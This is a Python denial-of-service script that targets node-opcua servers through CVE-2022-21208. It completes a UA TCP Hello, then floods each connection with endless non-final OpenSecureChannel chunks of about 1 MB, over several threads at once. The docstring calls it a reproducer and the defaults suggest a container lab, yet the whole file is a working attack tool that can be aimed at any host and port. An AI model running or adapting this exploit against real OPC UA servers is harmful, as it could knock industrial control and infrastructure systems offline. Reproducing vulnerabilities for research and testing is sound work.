#!/usr/bin/env python3
"""
OPC UA DoS attacker targeting node-opcua CVE-2022-21208.

Strategy
- Open TCP connections
- Perform UASC Hello/Ack handshake to look like a client
- Start a SecureChannel (OpenSecureChannelRequest) over UASC with a sequence of chunks
  and never send the Final chunk; keep sending more 'Intermediate' chunks with large bodies.

This stresses servers missing per-session/total chunk limits.

Notes
- This is a focused reproducer, not a full OPC UA stack.
- It crafts minimal UASC (message header + chunk header + payload).
- Default chunk payload size is modest to avoid excessive container memory; tune via env.

References
- OPC UA Part 6 (UASC): message structure and chunking
- node-opcua CVE-2022-21208 description
"""
from __future__ import annotations
import argparse
import os
import socket
import struct
import threading
import time
from typing import Optional

# UASC message types
MSG_HEL = b"HELF"  # Hello (Hello + 'F' to fit 4 bytes: spec shows 'HEL' + 'F' flag, we treat as 4-byte string)
MSG_ACK = b"ACKF"  # Ack
MSG_OPN = b"OPNF"  # OpenSecureChannel

# Chunk types
CHUNK_INTERMEDIATE = b"C"  # Continuation
CHUNK_FINAL = b"F"

# Helpers for endian
LE_U32 = "<I"
LE_U16 = "<H"


def build_hello(max_msg_size: int = 0x400000, max_chunk_count: int = 0xffffffff, recv_buf_size: int = 0xffff) -> bytes:
    """Build a minimal Hello message according to UA TCP.

    UA TCP Hello fields:
    - MessageType 'HEL' + ChunkType (we'll use 'F') => 4 bytes
    - MessageSize: uint32
    - ProtocolVersion: uint32
    - ReceiveBufferSize: uint32
    - SendBufferSize: uint32
    - MaxMessageSize: uint32
    - MaxChunkCount: uint32
    - EndpointUrl (string) - we'll send empty
    """
    message_type = b"HEL" + CHUNK_FINAL
    protocol_version = 0
    send_buf_size = recv_buf_size
    endpoint_url = b"\x00\x00\x00\x00"  # empty UA String: length -1? We'll send length 0 and no content
    # Proper UA String is int32 length. -1 for null; 0 for empty string.
    endpoint_url = struct.pack("<i", 0)

    header_and_fields = (
        message_type
        + struct.pack(LE_U32, 0)  # placeholder size
        + struct.pack(LE_U32, protocol_version)
        + struct.pack(LE_U32, recv_buf_size)
        + struct.pack(LE_U32, send_buf_size)
        + struct.pack(LE_U32, max_msg_size)
        + struct.pack(LE_U32, max_chunk_count)
        + endpoint_url
    )
    total_size = len(header_and_fields)
    # Patch size at bytes 4..8
    return header_and_fields[:4] + struct.pack(LE_U32, total_size) + header_and_fields[8:]


def build_opn_chunk(body_size: int, sequence_number: int, request_id: int, final: bool = False) -> bytes:
    """Build an OPN UASC chunk with dummy body.

    UASC header layout:
    - MessageType 'OPN' + ChunkType (C/F)
    - MessageSize: uint32
    - SecureChannelId: uint32 (0 for OPN request)
    - SecurityHeader (Asymmetric): AlgorithmUri (UA String), SenderCertificate, ReceiverThumbprint
      We'll keep them empty (AlgorithmUri empty string => length 0)
    - SequenceHeader: SequenceNumber(uint32), RequestId(uint32)
    - Body: arbitrary bytes
    """
    chunk_type = CHUNK_FINAL if final else CHUNK_INTERMEDIATE
    message_type = b"OPN" + chunk_type
    secure_channel_id = 0

    # Asymmetric SecurityHeader with empty strings
    # UA String: int32 length followed by bytes. Use 0 for empty.
    empty_ua_string = struct.pack("<i", 0)
    security_header = empty_ua_string + empty_ua_string + empty_ua_string

    sequence_header = struct.pack(LE_U32, sequence_number) + struct.pack(LE_U32, request_id)

    body = b"A" * body_size

    # Assemble without size first
    packet_wo_size = (
        message_type
        + struct.pack(LE_U32, 0)  # placeholder size
        + struct.pack(LE_U32, secure_channel_id)
        + security_header
        + sequence_header
        + body
    )
    total_size = len(packet_wo_size)
    return packet_wo_size[:4] + struct.pack(LE_U32, total_size) + packet_wo_size[8:]


def attack_once(host: str, port: int, chunk_size: int, sleep_between: float, log_every: int, conn_index: int) -> None:
    s: Optional[socket.socket] = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(5)
        s.connect((host, port))

        # Send Hello
        hello = build_hello()
        s.sendall(hello)

        # Read Ack (best effort)
        try:
            hdr = s.recv(8)
            # Don't verify contents; continue regardless
        except Exception:
            pass

        # Flood OPN chunks endlessly without final chunk
        s.settimeout(None)
        seq = 1
        req_id = 1
        sent = 0
        while True:
            pkt = build_opn_chunk(chunk_size, seq, req_id, final=False)
            s.sendall(pkt)
            seq += 1
            sent += 1
            if log_every and sent % log_every == 0:
                print(f"[conn {conn_index}] sent {sent} OPN chunks of {chunk_size} bytes body")
            if sleep_between > 0:
                time.sleep(sleep_between)
    except Exception as e:
        print(f"[conn {conn_index}] connection ended: {e}")
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default=os.environ.get("HOST", "opcua-server"))
    p.add_argument("--port", type=int, default=int(os.environ.get("PORT", "4840")))
    p.add_argument("--connections", type=int, default=int(os.environ.get("CONNECTIONS", "1")))
    p.add_argument("--chunk-size", type=int, default=int(os.environ.get("CHUNK_SIZE", "1048576")))
    p.add_argument("--sleep-between", type=float, default=float(os.environ.get("SLEEP_BETWEEN", "0")))
    p.add_argument("--log-every", type=int, default=int(os.environ.get("LOG_EVERY", "100")))
    args = p.parse_args()

    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=attack_once, kwargs=dict(
            host=args.host,
            port=args.port,
            chunk_size=args.__dict__["chunk_size"],
            sleep_between=args.__dict__["sleep_between"],
            log_every=args.__dict__["log_every"],
            conn_index=i,
        ), daemon=False)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
